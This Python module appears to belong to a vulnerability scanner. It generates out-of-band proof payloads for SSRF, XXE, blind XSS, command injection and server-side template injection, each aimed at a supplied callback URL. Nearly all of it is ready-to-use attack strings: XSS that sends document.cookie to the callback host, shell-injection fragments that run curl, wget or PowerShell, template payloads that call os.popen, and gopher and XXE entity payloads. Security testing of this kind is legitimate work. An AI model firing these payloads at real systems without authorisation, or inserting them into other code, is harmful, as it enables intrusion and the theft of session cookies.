"""Generate OOB payloads per vulnerability class.

Each function takes a callback URL and returns a list of payloads that, if
the target is vulnerable, will cause it to make an HTTP request to that URL —
proving the vulnerability out-of-band.
"""
from __future__ import annotations

import urllib.parse


def ssrf_oob(callback_url: str) -> list[str]:
    """SSRF payloads that trigger an outbound HTTP request to *callback_url*."""
    host = urllib.parse.urlparse(callback_url).netloc
    return [
        callback_url,
        # URL-encoded
        urllib.parse.quote(callback_url, safe=""),
        # With trailing path
        f"{callback_url}/ssrf",
        # Redirect via open-redirect pattern
        f"http://127.0.0.1@{host}/",
        # Double-URL-encoded scheme
        f"%68%74%74%70%3a%2f%2f{host}/",
        # With fragment (some parsers strip it, some don't)
        f"{callback_url}#ssrf",
        # Decimal IP (if host is an IP)
        # Gopher wrapper
        f"gopher://{host}:80/_GET%20/cb/ssrf%20HTTP/1.0%0d%0a%0d%0a",
    ]


def xxe_oob(callback_url: str) -> list[str]:
    """XXE payloads that exfiltrate or confirm via *callback_url*."""
    return [
        # Classic external entity
        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]><root>&xxe;</root>',
        # Parameter entity (blind)
        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{callback_url}">%xxe;]><root/>',
        # UTF-16 encoding declaration
        f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]><r>&xxe;</r>',
        # XInclude
        f'<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="{callback_url}"/></foo>',
        # SVG wrapper
        f'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "{callback_url}">]><text>&xxe;</text></svg>',
        # SOAP envelope
        f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{callback_url}">]><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body>&xxe;</soap:Body></soap:Envelope>',
    ]


def xss_oob(callback_url: str) -> list[str]:
    """Blind XSS payloads that phone home to *callback_url*."""
    return [
        # Image tag (simplest, works in most contexts)
        f'<img src="{callback_url}">',
        # Script with cookie exfil
        f'<script>new Image().src="{callback_url}?c="+document.cookie</script>',
        # SVG onload
        f'<svg onload="new Image().src=\'{callback_url}?d=\'+document.domain">',
        # Fetch API
        f'<script>fetch("{callback_url}?origin="+location.origin)</script>',
        # Event handler
        f'<img src=x onerror="new Image().src=\'{callback_url}\'">',
        # CSS import (works in style context)
        f'<style>@import url("{callback_url}");</style>',
        # Link prefetch
        f'<link rel=prefetch href="{callback_url}">',
        # Video poster
        f'<video poster="{callback_url}"></video>',
    ]


def rce_oob(callback_url: str) -> list[str]:
    """RCE payloads that phone home via system commands."""
    host = urllib.parse.urlparse(callback_url).netloc
    path = urllib.parse.urlparse(callback_url).path or "/cb/rce"
    return [
        # curl
        f"; curl {callback_url}",
        f"| curl {callback_url}",
        f"`curl {callback_url}`",
        f"$(curl {callback_url})",
        # wget
        f"; wget -q -O /dev/null {callback_url}",
        f"| wget -q -O /dev/null {callback_url}",
        # nslookup / dig (DNS-based, works where HTTP is blocked)
        f"; nslookup {host}",
        f"; dig {host}",
        # Bash specific
        f"; /usr/bin/curl {callback_url}",
        # PowerShell (Windows)
        f"; powershell -c \"Invoke-WebRequest {callback_url}\"",
        f"& curl {callback_url}",
    ]


def ssti_oob(callback_url: str) -> list[str]:
    """SSTI payloads that trigger outbound HTTP via template engines."""
    return [
        # Jinja2
        f'{{% import os %}}{{% set _ = os.popen("curl {callback_url}").read() %}}',
        # Twig
        f'{{{{["curl {callback_url}"]|filter("system")}}}}',
        # Freemarker
        f'${{" curl {callback_url}".execute()}}',
        # Mako
        f'${{__import__("os").popen("curl {callback_url}").read()}}',
    ]


ALL_GENERATORS = {
    "SSRF": ssrf_oob,
    "XXE Injection": xxe_oob,
    "XSS Injection": xss_oob,
    "Command Injection": rce_oob,
    "SSTI": ssti_oob,
}


def oob_payloads_for(attack_class: str, callback_url: str) -> list[str]:
    """Get OOB payloads for an attack class, or empty if not applicable."""
    gen = ALL_GENERATORS.get(attack_class)
    if gen:
        return gen(callback_url)
    # Try partial match
    for key, gen_fn in ALL_GENERATORS.items():
        if key.lower() in attack_class.lower() or attack_class.lower() in key.lower():
            return gen_fn(callback_url)
    return []
